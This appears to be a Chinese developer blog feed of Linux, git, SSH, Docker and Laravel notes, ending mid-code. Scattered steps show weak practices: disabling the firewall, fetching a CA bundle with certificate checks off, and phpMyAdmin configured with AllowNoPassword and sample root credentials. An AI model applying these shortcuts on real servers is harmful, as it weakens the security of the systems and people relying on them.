archiveshttps://www.daemoncoder.com/a/%E8%AE%B0%E4%B8%80%E6%AC%A1crontab%E4%B8%ADdate%E5%91%BD%E4%BB%A4%E9%94%99%E7%94%A8%E5%AF%BC%E8%87%B4%E7%9A%84%E9%97%AE%E9%A2%98/4d54453d 查出访问量TOP10的IP1234567891011日志文件access.log格式如下：127.0.0.1 - - [18/Nov/2018:17:26:54 +0800] "GET / HTTP/1.0" 200 3283 "-" "" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36" 0.012 127.0.0.1 127.0.0.1:9000 daemoncoder.com "-"Linux命令：awk -F " " '&#123;count[$1]++&#125; END &#123;for (i in count) &#123;printf("%s\t%d\n", i, count[i]);&#125;&#125;' access.log | sort -nrk 2 | head通过awk对日志中的每一行ip进行计数统计，并按ip count格式输出。通过sort命令按照第二列降序排序：-t 指定分割符是空格; -n指定按数字大小排序; -r 指定降序输出; -k 指定按分隔后的第二列排序通过head命令取出前十条。https://www.daemoncoder.com/a/%E4%B8%80%E8%A1%8CLinux%E5%91%BD%E4%BB%A4%E6%9F%A5%E5%87%BA%E8%AE%BF%E9%97%AE%E9%87%8FTOP10%E7%9A%84IP/4d773d3d phpmyadmin 管理多台 MySQL123456789101112131415161718192021复制 phpMyAdmin 根目录下的 config.sample.inc.php 文件，重命名为 config.inc.php；在文件中定义你的多台服务器配置信息：$hosts = [ 1 =&gt; ['host' =&gt; 'localhost', 'user' =&gt; 'root', 'password' =&gt; 'root'], 2 =&gt; ['host' =&gt; '192.168.10.10', 'user' =&gt; 'homestead', 'password' =&gt; 'secret']];在加入以下代码片段，通过 for 循环来读取多台 MySQL 服务器配置信息for($i = 1; $i &lt;= count($hosts); $i++)&#123; /* Authentication type */ $cfg['Servers'][$i]['auth_type'] = 'cookie'; /* Server parameters */ $cfg['Servers'][$i]['host'] = $hosts[$i]['host']; //修改host $cfg['Servers'][$i]['connect_type'] = 'tcp'; $cfg['Servers'][$i]['compress'] = false; /* Select mysqli if your server has it */ $cfg['Servers'][$i]['extension'] = 'mysql'; $cfg['Servers'][$i]['AllowNoPassword'] = true; $cfg['Servers'][$i]['user'] = $hosts[$i]['user']; //修改用户名 $cfg['Servers'][$i]['password'] = $hosts[$i]['password']; //密码&#125;https://learnku.com/articles/31740 pull request流程12345678910111213141516在 GitHub 上把本项目 fork 到自己的仓库，如 &lt;your-username&gt;/php-developer-prepares，然后 clone 到本地，并设置用户信息。$ git clone git@github.com:&lt;your-username&gt;/php-developer-prepares.git$ cd php-developer-prepares$ git config user.name "yourname"$ git config user.email "your email"修改代码后提交，并推送到自己的仓库。$ #do some change on the content$ git commit -am "Fix issue #1: change helo to hello"$ git push在 GitHub 网站上提交 pull request。定期使用项目仓库内容更新自己仓库内容。$ git remote add upstream https://github.com/zacao/php-developer-prepares$ git fetch upstream$ git checkout master$ git rebase upstream/master$ git push -f origin master SSH 也通过 SS 代理1234567 配置您的 ~/.ssh/config 文件，增加以下的内容即可：Host github.com HostName github.com User git ProxyCommand nc -v -x 127.0.0.1:1086 %h %phttps://learnku.com/articles/37108 Github 关键字进行搜索123456789101112in:name Laravelin:readme Laravelin:decription Laravelin:description Laravel stars:&gt;1000 forks:&gt;1000in:descrption Laravel stars:1000..2000in:description 验证码 language:phpin:description 验证码 language:php pushed:&gt;2019-05-01 # 过滤大于 2019-05-01之后提交的in:description 验证码 language:php created:&gt;2019-05-01 # 过滤大于 2019-05-01创建的user:overtrueuser:laravelhttps://learnku.com/articles/38106 https://github.com/search/advancedfollowers:&gt;1000 language:PHP location:China Bash 单命令行解释123456789101112131415161718192021222324252627282930313233343536373839清空文件 &gt; file echo "some string" &gt; file echo "foo bar baz" &gt;&gt; file line=$(head -1 file) line=`head -1 file` 一行行地读取文件 $ while read -r line; do # do something with $line done &lt; file $ str="hello world" $ echo $&#123;str:6&#125;//world echo $&#123;str:7:2&#125; echo $&#123;#str&#125;//12 $ if [[ $str =~ [0-9]+.[0-9]+ ]]; then # 执行一些操作 fi $ if [[ $file = *.zip ]]; then # 执行一些操作 fi $ if [[ $answer = [Yy]* ]]; then # 执行一些操作 fi $ str=baz-foo-bar-foo-foo $ echo $&#123;str/foo/bar&#125; baz-bar-bar-foo-foo $ echo "$x$y"//合并 $ echo foo&#123;,,,,,,,,,,&#125;//重复生成 echo &#123;a,b,c&#125;&#123;1,2,3&#125; a1 a2 a3 b1 b2 b3 c1 c2 c3printf "%02d " &#123;0..9&#125;//00 01 02 03 04 05 06 07 08 09echo &#123;1..100&#125;$ echo &#123;a..z&#125;//a b c d e f g h i j k l m n o p q r s t u v w x y zecho $(printf "%c" &#123;a..z&#125;)abcdefghijklmnopqrstuvwxyzhttps://learnku.com/articles/38528 https://learnku.com/articles/38449 列出目录下所有被 git 忽略的文件find . -type f | git check-ignore –stdin SSH 闲置时间过长而断开123456789101112131415161718// 修改/etc/ssh/sshd_config配置文件，找到ClientAliveCountMax（单位为分钟）修改你想要的值，// 执行$ service sshd reload // 找到所在用户的.ssh目录,如root用户该目录在：$ /root/.ssh/// 在该目录创建config文件$ vi /root/.ssh/config// 加入下面一句：ServerAliveInterval 60// 保存退出，重新开启root用户的shell，则再ssh远程服务器的时候，不会因为长时间操作断开。应该是加入这句之后，ssh客户端会每隔一段时间自动与ssh服务器通信一次，所以长时间操作不会断开。https://learnku.com/articles/38759// 修改/etc/profile配置文件$ vi /etc/profile增加：TMOUT=1800这样30分钟没操作就自动LOGOUT 安装 swoole laravelS12345678910111213141516171819pecl install swoole $ pecl channel-update pecl.php.net$ php -r "print_r(openssl_get_cert_locations());"[default_cert_file] =&gt; /usr/lib/ssl/cert.pem[default_cert_file_env] =&gt; SSL_CERT_FILE[default_cert_dir] =&gt; /usr/lib/ssl/certs[default_cert_dir_env] =&gt; SSL_CERT_DIR[default_private_dir] =&gt; /usr/lib/ssl/private[default_default_cert_area] =&gt; /usr/lib/ssl[ini_cafile] =&gt;[ini_capath] =&gt;安装证书$ wget -c https://curl.haxx.se/ca/cacert.pem /usr/local/openssl/cert.pem --no-check-certificate开启 swoole 扩展$ echo 'extension=swoole.so' &gt;&gt; /etc/php/7.3/mods-available/swoole.ini$ ln -s /etc/php/7.3/mods-available/swoole.ini /etc/php/7.3/cli/conf.d/20-swoole.inihttps://learnku.com/articles/38355 error src refspec matches more than one1234567git push origin testerror: src refspec test matches more than one.error: failed to push some refs togit tag |grep test因为有一个与当前提交分支同名的标签git tag -d testgit push origin test ssh 连接 实现免密码登陆12345678910111213141516171819202122232425262728293031323334353637383940411.主配置文件于/etc/ssh/sshd_config2.Port 22 端口声明指定sshd服务器将侦听连接的端口 如需更改端口 直接添加后 测试完成 再删除 223.PermitRootLogin 选择是否允许root登录4.LoginGraceTime 指定在未成功登录的情况下保持连接活动的秒数[root@7S ssh]# sudo service ssh restart 重启服务[root@7S ssh]# sudo systemctl restart ssh[root@7S ssh]# systemctl stop firewalld.service //关闭防火墙 [root@7S ssh]# systemctl is-enabled firewalld.service //查看防火墙状态 enabled [root@7S ssh]# firewall-cmd --zone=public --add-port=1212/tcp --permanent 添加 放行端口 1212 FirewallD is not running // 防火墙关闭 [root@7S ssh]# systemctl restart firewalld.service //启动 [root@7S ssh]# firewall-cmd --zone=public --add-port=1212/tcp --permanent //继续添加 success [root@7S ssh]# firewall-cmd --zone=public --list-ports //查看所有端口[root@7S ssh]# ssh-keygen -t rsa //创建按 Enter 键接受默认值 (Mac)密钥在〜/.ssh/id_rsa.pub和〜/.ssh / id_rsa中 (window 系统不一样 Admin文件名不一样) /C/users/Admin/.ssh/id_rsassh-copy-id root@192.168.100.00 // 将公钥复制到远程服务器 输入密码 下次不需要使用密码 即可登录更改 端口 登录$ ssh -p 1212 root@192.168.100.00安全考虑 禁用密码验证[root@7S ssh]# /etc/ssh/sshd_config// PasswordAuthentication no //去掉注释 改为 no// PubkeyAuthentication yes // 默认不修改// ChallengeResponseAuthentication no // 默认不修改sudo systemctl restart ssh // 重启服务 如有错误 关闭 SELinux 或者 向 SELinux 中添加修改的 SSH 端口 (如下)ssh-copy-id -i ~/.ssh/id_rsa.pub root@192.168.100.000 // 将本机的 id_rsa.pub 公钥文件内容复制到远程目标机的.ssh/authorized_keys 文件中本地复制: scp .ssh/id_rsa.pub user@192.168.1.100:/home/root/服务器操作:[root@7S ssh]# mkdir -p /home/root/.ssh/[root@7S ssh]# mv /home/root/id_rsa.pub /home/root/.ssh/authorized_keys //authorized_keys 必须如此命名https://learnku.com/articles/38761 CentOS 部署 Laravel 应用1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162$ yum install nginx $ systemctl nginx start # 启动 Nginx $ systemctl nginx stop # 停止 Nginx $ systemctl nginx restart # 重启 Nginx$ systemctl enable nginx.service # 设置开机自启动$ systemctl disable nginx # 禁用 Nginx 开机启动$ systemctl list-dependencies | grep nginx # 检查开机自启动是否设置成功浏览器访问不成功 解决办法方法一: systemctl stop firewalld.service # 关闭防火墙方法二: firewall-cmd --zone=public --add-port=80/tcp --permanent # 添加80端口firewall-cmd --reload # 重启防火墙firewall-cmd --list-ports # 查看是否添加成功1212/tcp 80/tcp # 显示 即成功 1212 设置的其他端口浏览器访问Welcome to nginx! # 成功显示安装 PHP$ yum install -y php72w php72w-cli php72w-fpm # PHP 自身 / cli PHP 的命令行接口 / 用于管理 PHP 进程，并提供 FastCGI 接口与 Nginx 交互$ yum install -y php72w-mbstring php72w-xml php72w-bcmath # 安装扩展 $ php -m # 查看扩展$ php -v # 查看 PHP 版本$ systemctl restart php-fpm # 重启 PHP-FPM $ systemctl start php-fpm # 启动 PHP-FPM $ systemctl stop php-fpm # 停止 PHP-FPM$ systemctl enable php-fpm # 启用 PHP-FPM 开机启动 $ systemctl disable php-fpm # 禁用 PHP-FPM 开机启动 $ ps aux | grep php # 确认 PHP-FPM 正常运行 $ yum install -y git$ git --version # 查看 git 版本# 生成 SSH 秘钥$ ls -al ~/.ssh # 查看是否 存在 `id_rsa` 与文件 `id_rsa.pub`$ ssh-keygen -t rsa -C "your_email@example.com" # 一路回车【密码为空】$ ls -al ~/.ssh # 再次查看是否生成成功$ cat ~/.ssh/id_rsa.pub # 查看公钥内容Composer############################################$ php -r "copy('https://getcomposer.org/installer', 'composer-setup.php');" # 或者使用 `$ wget -O composer-setup.php https://getcomposer.org/installer` $ php -r "if (hash_file('sha384', 'composer-setup.php') === 'a5c698ffe4b8e849a443b120cd5ba38043260d5c4023dbf93e1558871f1f07f58274fc6f4c93bcfd858c6bd0775cd8d1') &#123; echo 'Installer verified'; &#125; else &#123; echo 'Installer corrupt'; unlink('composer-setup.php'); &#125; echo PHP_EOL;" $ php composer-setup.php --filename=composer --install-dir=/usr/local/bin --version=1.9.0 $ php -r "unlink('composer-setup.php');" # 检查安装情况 $ composer --version # 淘宝全量镜像【https://learnku.com/composer/wikis/30594】 $ composer config -g repo.packagist composer https://mirrors.aliyun.com/composer/ $ rpm -ivh https://dev.mysql.com/get/mysql80-community-release-el7-3.noarch.rpm # 安装 mysql 官方 yum 源$ yum list | grep mysql # 查看 MySQL yum 源 发现只有 mysql80 的包，这是因为没有开启 mysql57 的包 $ yum-config-manager --disable mysql80-community # 关闭 80 包，开启 57 包$ yum-config-manager --enable mysql57-community # 遇到问题 yum-config-manager: command not found 解决 安装 yum -y install yum-utils$ yum list | grep mysql # 发现有了 mysql57 的包$ yum install -y mysql-community-server # 安装 mysql$ yum install -y mysql-community-client # 根据需要安装（可不装）$ systemctl start mysqld # 启动 mysql$ systemctl stop mysqld # 停止 mysql$ service mysqld status # 或 ps -ef | grep mysql //检查mysql正常启动$ systemctl enable mysqld.service #设置mysqld服务开机自启动 $ systemctl list-dependencies | grep mysqld #检查mysqld开机自启动是否设置成功$ grep 'temporary password' /var/log/mysqld.log # 查看超级账户 root 临时密码 mysql5.7 增强了安全机制, 系统会自动生成一个随机的密码$ mysql -uroot -pmysql&gt; ALTER USER "root"@"localhost" IDENTIFIED BY '你的新密码'; # 修改超级账户 root 密码mysql&gt; flush privileges;mysql&gt; exit;$ systemctl restart mysqld.servicehttps://learnku.com/articles/35573#reply123613 Docker Contos 搭建 PHP 环境1234567891011121314151617181920docker pull nginx // 拉取官方镜像docker images // 查看docker run -p 80:80 -d --name mynginx -v /docker/www:/usr/share/nginx/www nginx // 开启 nginx 应用容器-p 80:80：将容器的80端口映射到主机的80端口 -d 后台运行(守护进程) --name mynginx：将容器命名为mynginx -v 将主机中当前目录下的www挂载到容器的www目录docker ps -a // 查看容器启动情况docker pull php:7.2-fpm // 拉取官方 PHP 镜像docker images // 查看docker run -p 9000:9000 -d --name myphp-fpm -v /docker/www:/usr/share/nginx/www php:7.1-fpm // 开启 php-frm 应用容器docker ps -a // 查看容器启动情况docker inspect myphp-fpm | grep "IPAddress" // 查看 ip 信息"SecondaryIPAddresses": null,"IPAddress": "172.17.0.3","IPAddress": "172.17.0.3",[root@localhost ~]# docker exec -it mynginx bash // 进入容器vi /etc/nginx/conf.d/default.conf // 修改配置文件然后使用 ctrl + p + q 退出容器，使用 exit 的话会让容器停止。docker cp mynginx:/etc/nginx/conf.d/default.conf ./default.confhttps://learnku.com/articles/38766 git 笔记1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162git clone 命令默认的只会建立master分支 // 特别提醒git clone -b [new_branch_name] 仓库地址 // clone时创建新的分支替代默认origin/mastergit clone 仓库地址 // 从远程库拉到本地 文件名为仓库名 如 git@gitee.com:momingsixiali/git.git 拉到本地文件名为 gitgit clone 仓库地址 "指定目录" // 拉到本地文件名 为 指定的目录 如 git clone git@gitee.com:momingsixiali/git.git zhiding 本地文件名为 zhidinggit mv demo demo1 // 不会破坏git历史 等效于 如下:mv demo demo1 // 修改文件名git add demo1 // 添加到暂存区git rm demo // 更改demo的提交历史到 demo1git reset --hard // 危险命令 分支的指针都指向上一个提交 无法找回 移动 HEAD-&gt;更新索引-&gt;更新暂存区工作区git reset --soft // 分支的指针都指向上一个提交 本次提交还在 只是不显示git reset --mixed // 分支的指针都指向上一个提交 只是回退暂存区 工作区还在 推荐使用 也是 git 默认git grep login // 查找该仓库里所有使用'login'的地方 相当于 Linux中的 grep 返回如下 app/Http/Controllers/Auth/LoginController.php: * Where to redirect users after login.git grep -n login // 显示 行号 git grep --name-only login // 只显示文件名 app/Http/Controllers/Auth/LoginController.php git grep -c login // 查看每个文件里有多少行匹配 app/Http/Controllers/Auth/LoginController.php:1 git grep login 5027c63 // 指定提交索引 找 git grep -e 'name' --and -e email // 同时满足 name 和 email app/Models/User.php: 'name', 'email', 'password', composer.lock: "name": "egulias/email-validator", git grep --all-match -e 'name' -e email 97bacf05d4 // 满足name 或 email git grep -e 'name' --and -e -e MAX . git grep -e 'password' --and ( -e name -e email ) // 同时满足 password 和 (name 或者 email) // 可组合使用 git grep -n -e 'password' --and -e email 97bacf05d4 git log -p // 显示每个commit具体修改的内容，输出的形式以diff的形式给出 git show // 同git log -p输出类似，不同在于show只显示一个commit的内容，如果不指定commit hash, 它默认输出HEAD指向commit的内容 git shortlog // 显示汇总信息，以用户进行分类 返回如下 moming (6): Merge branch 'dev' of https://github.com/wujianan/shop into dev 添加忽略文件 注册登录 邮箱验证功能 momingsixiali (1): 项目初始化 git shortlog -s // 显示用户 提交次数 按提交时间排序 git shortlog -n // 显示用户 提交次数 进行倒序排列 git log --author=moming // 显示 moming 的提交, 限定输出给定的用户 git log -2 // 限制 显示输出的数量 本次输出 2个 git log --after '12-22-2019' // --after和--before 限定指定日期的log git log --decorate --oneline // 显示对应commit所属的branch和tag信息 git log --all // 所有分支 git log --graph // 演化历史 包括所有分支 git log --oneline // 简化输出 git show 72939 // 显示指定提交的相关信息 git show 72939^&#123;tree&#125; //显示指定提交的目录结构 git show v1 // 显示指定 tag git diff // 显示工作区 和暂存区的 不同git diff --stat // 显示简单的 比较信息git diff master // 查看当前分支 与 master 分支的 不同之处git diff SHA1 SHA2 // 比较两个历史版本之间的差异 git push &lt;远程主机名&gt; &lt;本地分支名&gt;:&lt;远程分支名&gt; // 将本地分支的更新，推送到远程 git push origin :master // 危险 删除远程仓库的分支 等效于 git push origin --delete master git push //当前分支只有一个追踪分支 可省略 &lt;远程主机名&gt; &lt;本地分支名&gt;:&lt;远程分支名&gt; git push -u origin master // 将本地的master分支推送到origin远程，同时指定origin为默认，后面就可以不加任何参数使用git push git fetch 和 git pull // 功能是大致相同,都是起到了更新代码的作用 git pull看起来更像git fetch + get merge 建议使用 git fetch + get merge git pull 一旦代码有问题，很难找到出错的地方https://learnku.com/articles/38780 Shell-变量高级用法123456789echo $&#123;PATH/bin/BIN&#125; // 单个替换echo $&#123;PATH//bin/BIN&#125; // 全部替换echo $&#123;#var_str&#125;[wonbin@localhost ~]$ string="everything is just beginning"[wonbin@localhost ~]$ echo `expr index "$string" ux`16echo $&#123;var_str:3:5&#125; // 方法二， 开始位置3， 长度5echo `expr substr "$var_str" 1 5` // 方法五， 索引从开始1计数https://learnku.com/articles/39190 删除文件占用空间1234在清理过服务器上一个高达 100 多 G 的文件后，使用 df -h 查看存储空间仍然 100%。使用 du -h -x --max-depth=1 进行查看与 df -h 的结果不一致使用 lsof |grep deleted 进行查看是否有删除操作的异常进程发现有一个 php 进程在占用， kill 掉相关进程后恢复正常https://learnku.com/articles/39534 Linux 性能优化笔记 Nginx+rtmp 模块搭建流媒体视频点播服务 Docker — 从入门到实践 linux wiki Nginx 站点开启 HTTPS Docker 中安装 RabbitMQ Nginx 内嵌变量 Git 实现 Laravel 项目的自动化部署 Nginx 代理缓存 Git 的代码自动发布 Elasticsearch es安装和简单配置 配置安全的 SSH 服务 使用 fail2ban 来防范 SSH 暴力破解 在线crontab docker 快速搭建稳定安全的开发/生产环境 windows 10 WSL编码 初识 Shell html 转 pdf 命令行工具 wkhtmltopdf Centos7 搭建 Nextcloud个人网盘 三十分钟学会sed Linux工具快速教程 看例子学sed 工作中常用的 Linux 命令 工作中常用的 Shell 命令及技巧 PHPer 必知必会的 Linux 命令 Linux工具快速教程 你可能不知道的shell技巧 wget的15个震撼的例子 Linux 踩坑记 PHPer 必知必会的 Linux 命令 命令行的艺术 Nginx 学习笔记时序图 Windows 10 安装体验 打造高效的工作环境 – SHELL 篇https://github.com/coolshellx/articles 工作中常用的 Linux 命令]]></content>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[laravel 笔记]]></title>
    <url>%2F2019%2F03%2F27%2Flaravel-%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[事件的使用Laravel 启动流程分析1234567891011121314151617181920212223php artisan make:event UserRegisteredphp artisan make:listener SendWelcomeMail --event=UserRegisteredphp artisan make:listener UpdateReferrer --event=UserRegisteredprotected $listen = [ UserRegistered::class =&gt; [ SendWelcomeMail::class, UpdateReferrer::class, ]];https://learnku.com/articles/26152class User extends Model&#123; public static function boot() &#123; parent::boot(); static::created(function (User $user) &#123; \event(new UserRegistered($user)); &#125;); &#125;&#125; cron timeout12345678910111213141516171819202122232425crontab定时启动任务，flock保证互斥，timeout设置超时以及报警脚本flock -xn /tmp/lock /path/to/php /path/to/file让我们再来重放一下故障场景：假如上一分钟的 A 请求还没退出，下一分钟的 B 请求也启动了，那么 B 请求会发现 A 请求还没有释放锁，于是它不会执行。假如因为某些无法预知的原因，导致脚本不能正常结束请求，进而导致不能正常释放锁，那么后续所有其它的 CD 等请求也都无法执行了，如何避免？答案是 timeout，它实现了超时控制机制：https://huoding.com/2016/12/12/573 https://juejin.im/post/5bb4fc0de51d450e597b6d51timeout -s SIGINT 100 flock -xn /tmp/lock /path/to/php /path/to/file让我们再来重放一下故障场景：假如上一分钟的 A 请求还没退出，下一分钟的 B 请求也启动了，那么 B 请求会发现 A 的请求还没有释放锁，于是它不会执行，不过下下分钟的 C 请求肯定能执行，因为在这之前，A 请求已经因为超时被 timeout 干掉了。# 超时发送-9信号，超时执行后面的脚本输出failedtimeout -s 9 5 sleep 20 || echo 'failed'# 未超时执行后面的脚本输出successtimeout -s 9 10 sleep 5 &amp;&amp; echo 'success' 需要注意的点timeout 正常结束的返回码是0timeout 超时kill结束的返回码是124 假设6分钟执行一次且互斥非阻塞，超时10分钟且超时执行报警脚本，则最终crontab文件如下 */6 * * * * cd /data/projec &amp;&amp; flock -xn ./task.lock -c 'timeout -9 600 sh task.sh || sh alarm.sh' 需要注意的点 如果task.sh启动了子进程进行处理，则需要在task.sh的末尾加上wait命令等待全部子进程完成才结束，否则timeout无效 cd /data/project nohub python3 main.py &gt;main.log 2&gt;&amp;1 &amp; wait https://juejin.im/post/5bb4fc0de51d450e597b6d51 杀死过期进程1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556 public function fire() &#123; try &#123; $pids = $this-&gt;getPids(["php", "shell_lock"]); foreach ($pids as $pid) &#123; $startTime = $this-&gt;getProcessStartTime($pid); $this-&gt;ifKill($startTime, $pid); &#125; &#125; catch (Exception $e) &#123; Log::error("[" . ClientIp::getIp() . "][LONG TIME KILLER]: " . $e-&gt;getMessage() . "\r\n" . $e-&gt;getTraceAsString()); &#125; &#125; protected function getPids($arr) &#123; $command = "ps aux | grep -v grep "; foreach ($arr as $word) &#123; $command .= "| grep &#123;$word&#125;"; &#125; $command .= " | awk '&#123;print $2&#125;'"; $result = shell_exec($command); $result = trim($result); if (empty($result)) &#123; return false; &#125; return explode("\n", $result); &#125; protected function getProcessStartTime($pid) &#123; /*ps -p 18994 -o lstart STARTED Thu Mar 21 10:25:38 2019 */ $command = "ps -p &#123;$pid&#125; -o lstart"; $result = shell_exec($command); $result = trim(str_replace("STARTED", "", $result)); if (empty($result)) &#123; return false; &#125; $ctime = \Carbon\Carbon::createFromFormat("D M j H:i:s Y", $result); return $ctime; &#125; protected function ifKill(Carbon $ctime, $pid) &#123; if ($ctime-&gt;lt(\Carbon\Carbon::now()-&gt;addHours(-1))) &#123; $cmd = file_get_contents("/proc/&#123;$pid&#125;/cmdline"); $logString = Carbon::now()-&gt;toDateTimeString() . "]Killing pid &#123;$pid&#125; started at " . $ctime-&gt;toDateTimeString() . " lasts for more than 1 hour, start script is `" . $cmd . "`"; \Log::info($logString); shell_exec("kill -9 &#123;$pid&#125;"); &#125; &#125;for pid in $(ps aux|grep 'artisan ' | grep -v grep | awk '&#123;print $2&#125;'); do kill -9 $pid; doneps -ef | pgrep -f "search" | xargs kill -9 每个文章的前10条评论一同查询出来12345678910111213141516171819202122232425262728293031323334$posts = Post::paginate(15);$postIds = $posts-&gt;pluck('id')-&gt;all();//找出符合条件的 comments ，同时定义 @post, @rank 变量，这里没有用 all,get 等函数，此时并不会执行 SQL 语句。$sub = Comment::whereIn('post_id',$postIds)-&gt;select(DB::raw('*,@post := NULL ,@rank := 0'))-&gt;orderBy('post_id');//把上面构造的 sql 查询作为子表进行查询，根据 post_id 进行分区的同时 @rank 变量不断+1$sub2 = DB::table( DB::raw("(&#123;$sub-&gt;toSql()&#125;) as b") ) -&gt;mergeBindings($sub-&gt;getQuery()) -&gt;select(DB::raw('b.*,IF ( @post = b.post_id ,@rank :=@rank + 1 ,@rank := 1 ) AS rank, @post := b.post_id'));//取出符合条件的前10条comment$commentIds = DB::table( DB::raw("(&#123;$sub2-&gt;toSql()&#125;) as c") ) -&gt;mergeBindings($sub2) -&gt;where('rank','&lt;',11)-&gt;select('c.id')-&gt;pluck('id')-&gt;toArray();$comments = Comment::whereIn('id',$commentIds)-&gt;get();$posts = $posts-&gt;each(function ($item, $key) use ($comments) &#123; $item-&gt;comments = $comments-&gt;where('post_id',$item-&gt;id);&#125;);会产生三条sql https://learnku.com/articles/20315select * from `posts` limit 15 offset 0;select `c`.`id` from (select b.*,IF (@post = b.post_id ,@rank :=@rank + 1 ,@rank := 1) AS rank,@post := b.post_id from (select *,@post := NULL ,@rank := 0 from `comments` where `post_id` in ('2', '3', '4', '5', '6', '7', '8', '9', '10', '11', '12', '13', '14', '15', '16') order by `post_id` asc) as b) as c where `rank` &lt; '11';select * from `comments` where `id` in ('180', '589', '590', '3736'); Laravel 集合123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139https://learnku.com/laravel/t/26110 $users = User::all(); $users-&gt;contains('name', 'Chasity Tillman'); //true $collection = collect(['name' =&gt; 'John', 'age' =&gt; 23]); $collection-&gt;contains('Jane'); //false $collection = collect([1, 2, 3, 4, 5]); $collection-&gt;contains(function ($key, $value) &#123; return $value &lt;= 5; //true &#125;); $users = User::all(); $youngsters = $users-&gt;filter(function ($value, $key) &#123; return $value-&gt;age &lt; 35; &#125;); $youngsters-&gt;all(); // 所有年龄小于 35 的用户 $movies = collect([ [ 'name' =&gt; 'Back To The Future', 'releases' =&gt; [1985, 1989, 1990] ], [ 'name' =&gt; 'Fast and Furious', 'releases' =&gt; [2001, 2003, 2006, 2009, 2011, 2013, 2015, 2017] ], [ 'name' =&gt; 'Speed', 'releases' =&gt; [1994] ] ]); $mostReleases = $movies-&gt;sortByDesc(function ($movie, $key) &#123; return count($movie['releases']); &#125;); $mostReleases-&gt;toArray(); //列出以上映总数降序排序的电影 dd($mostReleases-&gt;values()-&gt;toArray()); /* 列出以上映总数降序排序的电影并重置键值 */ $movies = collect([ ['name' =&gt; 'Back To the Future', 'genre' =&gt; 'scifi', 'rating' =&gt; 8], ['name' =&gt; 'The Matrix', 'genre' =&gt; 'fantasy', 'rating' =&gt; 9], ['name' =&gt; 'The Croods', 'genre' =&gt; 'animation', 'rating' =&gt; 8], ['name' =&gt; 'Zootopia', 'genre' =&gt; 'animation', 'rating' =&gt; 4], ['name' =&gt; 'The Jungle Book', 'genre' =&gt; 'fantasy', 'rating' =&gt; 5], ]); $genre = $movies-&gt;groupBy('genre'); /* [ "scifi" =&gt; [ ["name" =&gt; "Back To the Future", "genre" =&gt; "scifi", "rating" =&gt; 8,], ], "fantasy" =&gt; [ ["name" =&gt; "The Matrix", "genre" =&gt; "fantasy", "rating" =&gt; 9,], ["name" =&gt; "The Jungle Book", "genre" =&gt; "fantasy", "rating" =&gt; 5, ], ], "animation" =&gt; [ ["name" =&gt; "The Croods", "genre" =&gt; "animation", "rating" =&gt; 8,], ["name" =&gt; "Zootopia", "genre" =&gt; "animation", "rating" =&gt; 4, ], ], ] */ $rating = $movies-&gt;groupBy(function ($movie, $key) &#123; return $movie['rating']; &#125;); /* [ 8 =&gt; [ ["name" =&gt; "Back To the Future", "genre" =&gt; "scifi", "rating" =&gt; 8,], ["name" =&gt; "The Croods", "genre" =&gt; "animation", "rating" =&gt; 8,], ], 9 =&gt; [ ["name" =&gt; "The Matrix", "genre" =&gt; "fantasy", "rating" =&gt; 9,], ], 4 =&gt; [ ["name" =&gt; "Zootopia","genre" =&gt; "animation", "rating" =&gt; 4,], ], 5 =&gt; [ ["name" =&gt; "The Jungle Book","genre" =&gt; "fantasy","rating" =&gt; 5,], ], ] */ &#125; $list = collect([ 'Albert', 'Ben', 'Charles', 'Dan', 'Eric', 'Xavier', 'Yuri', 'Zane' ]); //获取前两个名字 $firstTwo = $list-&gt;take(2); //['Albert', 'Ben'] //获取最后两个名字 $lastTwo = $list-&gt;take(-2); //['Yuri', 'Zane'] $list = collect([ 'Albert', 'Ben', 'Charles', 'Dan', 'Eric', 'Xavier', 'Yuri', 'Zane' ]); $chunks = $list-&gt;chunk(3); $chunks-&gt;toArray(); /* [ ["Albert", "Ben", "Charles",], [3 =&gt; "Dan", 4 =&gt; "Eric", 5 =&gt; "Xavier",], [6 =&gt; "Yuri", 7 =&gt; "Zane",], ] */ $names = collect([ 'Albert', 'Ben', 'Charles', 'Dan', 'Eric', 'Xavier', 'Yuri', 'Zane' ]); $names-&gt;transform(function ($name, $key) &#123; return strlen($name); &#125;); $names-&gt;toArray(); //[6, 3, 7, 3, 4, 6, 4, 4,] $names = collect([ 'Albert', 'Ben', 'Charles', 'Dan', 'Eric', 'Xavier', 'Yuri', 'Zane' ]); $names-&gt;transform(function ($name, $key) &#123; return strlen($name); &#125;); $names-&gt;toArray(); //[6, 3, 7, 3, 4, 6, 4, 4,] 队列执行失败反复执行1234567由于报错或者什么原因队列执行失败，但是队列的 attempts一直为1，可以手动throwtry&#123; &#125;catch (\Throwable $e) &#123; throw new \Exception("queue fail");&#125;php artisan xx --tries=2 实现Schemaless123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117mysql&gt; CREATE TABLE users ( id INT UNSIGNED NOT NULL AUTO_INCREMENT, created_at timestamp null, updated_at timestamp null, data JSON NOT NULL, PRIMARY KEY(id) );mysql&gt; ALTER TABLE users add name VARCHAR(100) AS (JSON_UNQUOTE(JSON_EXTRACT(data, '$.name'))) AFTER id;mysql&gt; ALTER TABLE users add address VARCHAR(100) AS (JSON_UNQUOTE(JSON_EXTRACT(data, '$.address'))) AFTER name;mysql&gt; ALTER TABLE users add level INT UNSIGNED AS (JSON_EXTRACT(data, '$.level')) AFTER name;然后是核心代码 Schemaless.php，以 trait 的方式实现：https://huoding.com/2017/01/14/590 &lt;?phpnamespace App;trait Schemaless&#123; public function getDirty() &#123; $dirty = collect(parent::getDirty()); $keys = $dirty-&gt;keys()-&gt;map(function($key) &#123; if (in_array($key, $this-&gt;virtual)) &#123; $key = $this-&gt;getDataColumn() . '-&gt;' . $key; &#125; return $key; &#125;); return $keys-&gt;combine($dirty)-&gt;all(); &#125; public function save(array $options = []) &#123; if (!$this-&gt;exists) &#123; $attributes = 